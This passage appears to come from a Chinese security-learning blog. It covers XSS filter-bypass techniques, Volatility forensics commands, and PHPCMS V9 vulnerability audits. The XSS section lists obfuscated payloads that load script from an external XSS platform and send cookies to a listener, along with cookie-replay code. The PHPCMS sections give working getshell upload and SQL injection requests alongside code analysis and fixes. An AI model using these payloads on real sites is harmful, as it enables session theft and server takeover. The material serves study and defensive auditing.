<h3 id="常见的绕过技巧"><a href="#常见的绕过技巧" class="headerlink" title="常见的绕过技巧"></a>常见的绕过技巧</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、用&#x2F;代替空格</span><br><span class="line">&lt;img&#x2F;src&#x3D;&quot;x&quot;&#x2F;onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">2、大小写绕过</span><br><span class="line">3、双写关键字</span><br><span class="line">4、字符拼接</span><br><span class="line">利用eval:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;a&#x3D;&#96;aler&#96;;b&#x3D;&#96;t&#96;;c&#x3D;&#39;(&#96;xss&#96;);&#39;;eval(a+b+c)&quot;&gt;</span><br><span class="line">利用top:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;top[&quot;al&quot;+&quot;ert&quot;](&#96;xss&#96;);&gt;</span><br><span class="line">    </span><br><span class="line">5、编码绕过</span><br><span class="line">------------------</span><br><span class="line">Base64编码</span><br><span class="line">------------------</span><br><span class="line">&#39;&quot;&gt;&lt;img src&#x3D;x id&#x3D;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy9uR1JTIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#x3D;&#x3D; onerror&#x3D;eval(atob(this.id))&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNDUmlQdC9TckM9Ly94c3M4LmNjL25HUlM+&quot;&gt;</span><br><span class="line">------------------</span><br><span class="line">ASCII编码</span><br><span class="line">------------------</span><br><span class="line">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,56,46,99,99,47,110,71,82,83,62,60,47,115,67,114,73,112,84,62))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line">-------------------</span><br><span class="line">空字节【未成功过，自测】</span><br><span class="line">-------------------</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;&#x2F;s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line">-------------------</span><br><span class="line">Unicode编码绕过</span><br><span class="line">-------------------</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</span><br><span class="line">-------------------</span><br></pre></td></tr></table></figure>

<h4 id="常见字符过滤"><a href="#常见字符过滤" class="headerlink" title="常见字符过滤"></a>常见字符过滤</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">*过滤&lt;script&gt;利用拼接然后继续使用XSS平台【双写，编码自己自己尝试】</span><br><span class="line">&lt;img src=x onerror=s=createElement(<span class="string">&#x27;scr&#x27;</span>+<span class="string">&#x27;ipt&#x27;</span>);body.appendChild(s);s.src=<span class="string">&#x27;//xss8.cc/nGRS&#x27;</span>;&gt;</span><br><span class="line"></span><br><span class="line">*过滤单双引号</span><br><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=alert(<span class="string">`xss`</span>);&gt;</span><br><span class="line">    </span><br><span class="line">*过滤括号</span><br><span class="line">当括号被过滤的时候可以使用<span class="keyword">throw</span>来绕过</span><br><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">*过滤url地址</span><br><span class="line">使用URL编码、十进制IP、八进制IP、hex、html标签中用<span class="comment">//可以代替http://、使用\\</span></span><br><span class="line">使用中文逗号代替英文逗号</span><br><span class="line"></span><br><span class="line">其他的Payload</span><br><span class="line">&lt;svg/onload=location=<span class="string">`javas`</span>+<span class="string">`cript:ale`</span>+<span class="string">`rt%2`</span>+<span class="string">`81%2`</span>+<span class="string">`9`</span>;</span><br><span class="line"></span><br><span class="line">Eval &amp; 其它冗余符号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="built_in">eval</span>()&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;~a~le~rt~~(~~1~~)~&#x27;</span>.replace(<span class="regexp">/~/g</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">eval</span>(\<span class="string">&#x27;~a~le~rt~~(~~1~~)~\&#x27;.replace(/~/g, \&#x27;\&#x27;))</span></span><br><span class="line"><span class="string">eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</span></span><br><span class="line"><span class="string">var x = eval; x(‘alert(1)’)</span></span><br><span class="line"><span class="string">(1, eval)(&#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">eval.call(null, &#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<h3 id="SVG黑魔法-IMG标签-等其他同理"><a href="#SVG黑魔法-IMG标签-等其他同理" class="headerlink" title="SVG黑魔法 IMG标签 等其他同理"></a>SVG黑魔法 IMG标签 等其他同理</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br><span class="line">&lt;svg/onload=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line">获取当前域名URL：</span><br><span class="line"><span class="built_in">window</span>.location.href</span><br><span class="line"><span class="built_in">document</span>.location</span><br><span class="line"><span class="built_in">document</span>.URL</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gqs7ls5nf0j30if087jug.jpg" alt="image-20210519080602555"></p>
<h3 id="图片探测路径"><a href="#图片探测路径" class="headerlink" title="图片探测路径"></a>图片探测路径</h3><blockquote>
<p>只要对方网站可以调用外部图片(或可自定义HTML)。你就可以拿到对方当前的后台、浏览器、IP地址之类的信息【有些网站做了meta referer设置，referer就抓不到了】<br>搜索图片XSS即可,XSS平台是有这种的。原理就是图片嵌入了前端的一些代码。</p>
<p>例如：&lt;img src=”<a href="http://ip/test.php&quot;/&gt;">http://IP/test.php&quot;/&gt;</a><br>然后再PHP里面写入获取HTTP_REFERER’<code>,</code>‘REMOTE_ADDR’<code>,</code>‘HTTP_USER_AGENT<br>即可达到目的</p>
</blockquote>
<h3 id="console设置Cookie"><a href="#console设置Cookie" class="headerlink" title="console设置Cookie"></a>console设置Cookie</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cookiestr=<span class="string">&quot;你的打到的cookie内容&quot;</span>;<span class="keyword">var</span> arr = cookiestr.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> arr)&#123;<span class="built_in">document</span>.cookie=arr[i];&#125;</span><br></pre></td></tr></table></figure>

<h3 id="前端钓鱼"><a href="#前端钓鱼" class="headerlink" title="前端钓鱼"></a>前端钓鱼</h3><p><a href="https://www.cnblogs.com/-qing-/p/10871625.html">https://www.cnblogs.com/-qing-/p/10871625.html</a></p>
<h3 id="apache-httponly-bypass"><a href="#apache-httponly-bypass" class="headerlink" title="apache httponly bypass"></a>apache httponly bypass</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="预防XSS"><a href="#预防XSS" class="headerlink" title="预防XSS"></a>预防XSS</h3><p>CSP策略：<a href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br>PHP的函数：htmlspecialchars、htmlentities</p>
<blockquote>
<p>​    htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号，所以咋只要’onmouseover=’alert(document.domain)这样既可绕过，根据实际情况来吧。</p>
</blockquote>
<p>参考：<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a><br><a href="https://www.cnblogs.com/-qing-/p/10872564.html">https://www.cnblogs.com/-qing-/p/10872564.html</a></p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Volatility</title>
    <url>/2021/07/17/Volatility/</url>
    <content><![CDATA[<p>#Volatility学习</p>
<blockquote>
<p>查看活动进程，我们还可以查看创建镜像时的活动网络连接！现在让我们使用命令 <code>volatility -f MEMORY_FILE.raw --profile=PROFILE netscan</code> 来执行此操作。</p>
</blockquote>
<blockquote>
<p>恶意软件试图隐藏自身以及与之关联的进程是很常见的。话虽如此，我们可以通过命令 <code>psxview</code> 查看有意隐藏的进程</p>
</blockquote>
<blockquote>
<p>除了通过 psxview 查看隐藏进程之外，我们还可以通过命令“ldrmodules”更加专注地检查这一点。这里中间会出现三列，InLoad、InInit、InMem。如果其中任何一个是错误的，则该模块可能已被注入，这是一件非常糟糕的事情。</p>
</blockquote>
<blockquote>
<p>当我们检查机器时，流程并不是我们唯一关心的领域。使用 ‘apihooks’ 命令，我们可以查看标准系统 DLL 中的意外补丁。如果我们看到 Hooking module: <unknown> 的实例，那真的很糟糕。</p>
</blockquote>
<blockquote>
<p>注入的代码可能是一个大问题，并且高度指示非常非常糟糕的事情。我们可以使用命令 <code>malfind</code> 来检查这一点。使用完整的命令 <code>volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D &lt;Destination Directory&gt;</code> 我们不仅可以找到此代码，还可以将其转储到我们指定的目录中。</p>
</blockquote>
<blockquote>
<p>使用命令 <code>dlllist</code> 列出内存中的所有 DLL</p>
</blockquote>
<blockquote>
<p>现在使用命令 <code>volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D &lt;Destination Directory&gt;</code> 执行此操作，其中 PID 是我们之前确定的受感染进程的进程 ID</p>
</blockquote>
<p>推荐文章：</p>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/109462833">https://blog.csdn.net/qq_43431158/article/details/109462833</a></p>
]]></content>
      <tags>
        <tag>杂七杂八</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPCMSV9版本代码审计学习</title>
    <url>/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>学习代码审计，自己简单记录一下。如有错误望师傅斧正。</p>
<h1 id="PHPCMS预备知识"><a href="#PHPCMS预备知识" class="headerlink" title="PHPCMS预备知识"></a>PHPCMS预备知识</h1><p>PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。</p>
<table>
<thead>
<tr>
<th align="left">参数名称</th>
<th align="left">描述</th>
<th align="left">位置</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">m</td>
<td align="left">模型/模块名称</td>
<td align="left"><code>phpcms/modules中模块目录名称</code></td>
<td align="left">必须</td>
</tr>
<tr>
<td align="left">c</td>
<td align="left">控制器名称</td>
<td align="left"><code>phpcms/modules/模块/*.php 文件名称</code></td>
<td align="left">必须</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">事件名称</td>
<td align="left"><code>phpcms/modules/模块/*.php 中方法名称</code></td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="PHPCMSV9-2上传Getshell"><a href="#PHPCMSV9-2上传Getshell" class="headerlink" title="PHPCMSV9.2上传Getshell"></a>PHPCMSV9.2上传Getshell</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们搭建好环境直接注册，找到修改头像。</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrigivnj30z60f2k4s.jpg" alt="image-20210713205932313">)</p>
<p>我们在本地创建一个zip文件里面包含一个文件夹，一个我们的恶意代码。通过Burp修改掉。</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrutaqtj30sv0a0454.jpg" alt="image-20210713210052053"></p>
<p>访问<code>phpsso_server/uploadfile/avatar/1/1/1/av/av.php</code> 其中1是我们的uid</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzs49tp2j319d0kaduq.jpg" alt="image-20210713212930046"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>重复以上步骤。通过burp我们找到上传事件，我们直接去代码定位这个函数。</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzsf6w3dj30u80csguv.jpg" alt="image-20210713210251188"></p>
<p>然后去代码找到函数直接断点调试</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzslx85uj30y10hydqz.jpg" alt="image-20210713210620009"></p>
<p>根据用户UID创建文件夹，防止用户多了文件夹重复创建了两次，然后检测目录创建，没有就创建一次，否则跳过。</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzstn2esj31bj0j6tmz.jpg" alt="image-20210713211150731"></p>
<p>根据uid重命名我们的压缩包文件</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzt0bshij31c10m5kd9.jpg" alt="image-20210713211348264"></p>
<p>压缩包的文件就是我们上传的压缩包文件</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzt7kgtdj30bk04774r.jpg" alt="image-20210713211535141"></p>
<p>之后进行解压缩文件</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzti1c3pj31aa0hn17y.jpg" alt="image-20210713211744654"></p>
<p>之后进入dir中循环判断文件安全，删除压缩包和非jpg图片</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshztns77ej318n0fb7dw.jpg" alt="image-20210713211943208"></p>
<p>走到遍历白名单判断文件，排除<code>.</code>（当前目录）<code>..</code>（上级目录）下图删除了压缩包文件</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzttgnamj311t0d6gxi.jpg" alt="image-20210713212302942"></p>
<p>再次循环时$file=av 而av是目录。unlink是不能删除目录的。所以出现异常。</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzu0r93cj30z607itd6.jpg" alt="image-20210713212333388"></p>
<p>所以进而我们的恶意文件留在了服务器里面。这就是为什么上面利用的压缩包里的恶意代码文件需要放在目录下</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>不使用zip压缩包处理图片文件。因为后端需要处理特别多的数据。</p>
<h1 id="PHPCMSV9-6-0任意文件上传漏洞"><a href="#PHPCMSV9-6-0任意文件上传漏洞" class="headerlink" title="PHPCMSV9.6.0任意文件上传漏洞"></a>PHPCMSV9.6.0任意文件上传漏洞</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先注册然后抓包</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzu6buhdj314l0e67co.jpg" alt="image-20210714095036774"></p>
<p>其中要准备一个远程的服务器下的恶意代码</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzuc5t5hj30nc05bgn0.jpg" alt="image-20210714104836022"></p>
<p>准备我们的POC如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=12345@qq.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://192.168.0.100/phpinfo.txt?.php#.jpg</span>&gt;</span>&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>

<p>然后修改放包会报一个错误，会返回我们的URL路径</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzul1xt5j312y07iafe.jpg" alt="image-20210714095300962"></p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzurpcydj31740nv17m.jpg" alt="image-20210714095331750"></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接找到刚刚我们的包，他是在<code>index.php</code>进入<code>member</code>模块中的<code>index</code>文件里面有一个<code>register</code>函数</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzuy4g3aj31e00gx7jx.jpg" alt="image-20210714100019749"></p>
<p>我们现在打开我们的代码定位函数，路径如下</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzv3xwb0j314q0gnthu.jpg" alt="image-20210714110048083"></p>
<p>为了更好的理解POC的巧妙。我们正常注册一次然后用POC注册一次分析</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzv9kibwj30x60lhdwc.jpg" alt="image-20210714131702013"></p>
<p>前面就是一堆信息的验证作用不大，我们继续跟踪到130行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$member_input</span> = <span class="keyword">new</span> member_input(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);		</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>] = array_map(<span class="string">&#x27;new_html_special_chars&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">	<span class="variable">$user_model_info</span> = <span class="variable">$member_input</span>-&gt;get(<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);	<span class="comment">//重点			        	&#125;</span></span><br></pre></td></tr></table></figure>

<p>在这里我们看见<code>$_POST[&#39;info&#39;]</code>使用了<code>member_input</code>类中的<code>get</code>方法我们跟踪进去。</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzvf38lpj313007sq91.jpg" alt="image-20210714172524854"></p>
<p>走到47行获取了<code>datatime</code>函数，<code>this-&gt;fields</code>是一个动态函数对应的一张表根据<code>modelid</code>来确定的<code>formytpe</code>。如下图</p>
<p>【也可以跟进去一步步来，微信搜索黑白天的文章。有详细解释，建议自己跟一遍】</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvla65yj31110nmwv0.jpg" alt="image-20210715111531976"></p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzvsdobdj312108nwj5.jpg" alt="image-20210714172423802"></p>
<p>我那们跟进去<code>datatime</code>函数 就是做了一校验然后又返回给<code>$value</code></p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvy3143j311b0d6gtu.jpg" alt="image-20210715112429559"></p>
<p>然后就是插入两次数据库，一个插入<code>v9_member</code>表一个生日日期和用户id插入到<code>v9_member_detail</code>表中，至此正常流程走完。</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzw4telvj31420fpqap.jpg" alt="image-20210714174943523"></p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzwaogknj313c0gawno.jpg" alt="image-20210714174429168"></p>
<p>接下来我们分析一下POC流程</p>
<blockquote>
<p>值得注意的是我们必须保证username email是唯一</p>
</blockquote>
<p> 然后我们继续定位到130行，发现<code>content</code>是我们的内容<img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzwgqsh5j314t0g5amp.jpg" alt="image-20210715115513282"></p>
<p> 经过<code>new_html_special_chars</code>就是防止XSS 所以实体化<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwo6x5oj30rc05r77f.jpg" alt="image-20210715115539585"></p>
<p> 于是我们变成了下面这样子。继续跟踪get方法同上<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwuxkkcj314h0grwrl.jpg" alt="image-20210715115601890"></p>
<p>这里我们获取的是<code>editor</code>函数。</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzx0f0hij313z0dwaig.jpg" alt="image-20210715114208216"></p>
<p>在这个函数中我们有一个<code>download</code>方法</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzx5z7tij60t405hadx02.jpg" alt="image-20210715122725543"></p>
<p>我们跟踪download方法，发现以下关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ext &#x3D; &#39;gif|jpg|jpeg|bmp|png&#39;</span><br><span class="line">if(!preg_match_all(&quot;&#x2F;(href|src)&#x3D;([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2&#x2F;i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure>

<p>这就是为什么我们写info[content]=&lt;img src-<a href="http://xxxx/phpinfo.txt?.php#.jpg%EF%BC%88%E7%AC%A6%E5%90%88%E8%BF%99%E4%B8%AA%E6%A0%BC%E5%BC%8F%EF%BC%8C%E8%80%8C%E4%B8%94%E5%8A%A0%60.jpg%60%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%89">http://xxxx/phpinfo.txt?.php#.jpg（符合这个格式，而且加`.jpg`的原因）</a></p>
<p>到155行这里他把我们的<code>$string</code>值复制给了<code>$matches</code> </p>
<p>$matches [3]刚好是我们的链接，所以真的很巧妙</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzxbfvs3j313b0h6gxm.jpg" alt="image-20210715120332699"></p>
<p>接着我们跟踪<code>fillurl</code>方法,里面有一串关键代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pos &#x3D; strpos($surl,&#39;#&#39;);</span><br><span class="line">		if($pos&gt;0) $surl &#x3D; substr($surl,0,$pos);</span><br></pre></td></tr></table></figure>

<p><code>strpos</code>定位#，然后使用<code>substr</code>处理<code>?.php#.jpg</code>，处理完之后<code>$surl =?.php</code>继续执行，可以发现返回的url去掉了#后面的内容</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzxh2uw7j60zb0fwqds02.jpg" alt="image-20210715120530900"></p>
<p>然后获取后缀名。然后通过<code>getname</code>方法生成时间+三位数的文件名，如果不返回文件地址的url我们也可以进行爆破处理。</p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzxmxzf2j312506c7b0.jpg" alt="image-20210715121811584"></p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxrz6f9j30no03w3ze.jpg" alt="image-20210715121521423"></p>
<p>此时进行了<code>copy</code>函数对远程文件下载</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxx4awzj31380aun5c.jpg" alt="image-20210715123850218"></p>
<p>这里的<code>$this-&gt;upload_func</code>是copy函数的原因，是因为初始化时赋给的</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzy2dovdj30po07jjvj.jpg" alt="image-20210715123444761"></p>
<p>此时我们的文件已经到我们的本地了</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzy7gau7j30ql0503zr.jpg" alt="image-20210715124006568"></p>
<p>接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了<code>register </code>函数中：</p>
<p>继续跟进<code>$this-&gt;db-&gt;insert($user_model_info);</code> 发现数据库插入的字段都不一样继续执行就会报错。前台提示的信息一样，没有这个字段当然报错</p>
<p>Message : Unknown column ‘content’ in ‘field list’</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzycogp2j310f0lk4e2.jpg" alt="image-20210715124757737"></p>
<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在phpcms9.6.1中修复了该漏洞，修复方案就是对用<code>fileext</code>获取到的文件后缀再用黑白名单分别过滤一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/(<span class="subst">$ext</span>)/is&quot;</span>,<span class="variable">$filename</span>) || in_array(<span class="variable">$filename</span>, 		<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;phtml&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;dll&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;cer&#x27;</span>,<span class="string">&#x27;asa&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>,<span class="string">&#x27;shtm&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>,<span class="string">&#x27;asax&#x27;</span>,<span class="string">&#x27;cgi&#x27;</span>,<span class="string">&#x27;fcgi&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>)))&#123;</span><br><span class="line"> 			<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="PHPCMSV9-6-0-WAP模块-SQL注入分析"><a href="#PHPCMSV9-6-0-WAP模块-SQL注入分析" class="headerlink" title="PHPCMSV9.6.0 WAP模块 SQL注入分析"></a>PHPCMSV9.6.0 WAP模块 SQL注入分析</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先第一步访问</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=wap&amp;c=index&amp;siteid=1</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzyibq26j30yf0bhdkh.jpg" alt="image-20210715161331519"></p>
<p>把得到的set-cookie 记录下来</p>
<p>第二步以POST方式访问【下面是测试爆user的】就是一个报错注入语句</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></table></figure>

<p>并且传参<code>userid_flash</code>其中的值就是第一步我们得到的<code>set-cookie</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;72eciDDbmkE3Tr6LjGQhB3H34p3N1xsgWWbi2VNY</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzynsljcj30yd0dxgst.jpg" alt="image-20210715162132366"></p>
<p>把加密的<code>json</code>值记录下来</p>
<p>第三步以POST的方式访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>

<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzytncdwj316i0emwn5.jpg" alt="image-20210715163120554"></p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其实我们就是通过最后一次提交的数据来爆出来的东西。我们就逆向分析。看第三步的URL做了些什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>

<p>我们定位到<code>content</code>模块<code>down</code>文件中发现并没有<code>a_k</code>方法</p>
<p>说明是自动执行的那就是<code>init()</code>和<code>__construct()</code></p>
<p><code>__construct()</code>基本没东西，我们直接下断<code>init</code></p>
<p>走到14行看到<code>sys_auth</code>然后他就是一个加密解密的函数，我们这里不分析加密解密只分析功能</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzyyyv6mj316m0al7dq.jpg" alt="image-20210715164258371"></p>
<p>经过<code>sys_auth</code>解密得到</p>
